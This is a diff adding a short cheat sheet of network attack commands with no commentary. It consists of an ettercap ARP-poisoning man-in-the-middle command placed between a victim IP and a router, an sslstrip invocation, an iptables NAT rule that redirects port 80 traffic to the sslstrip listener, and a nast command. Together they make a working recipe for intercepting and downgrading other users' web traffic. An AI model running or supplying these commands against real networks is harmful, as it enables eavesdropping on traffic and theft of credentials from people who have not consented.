@@ -1,0 +1,9 @@
+ettercap 0.8.2 / 2001-2015
+
+ettercap -T -q -i interface -M arp:remote /IP_victim/ /IP_router/
+
+sslstrip.py -f -l port
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 20000
+
+nast -p -c
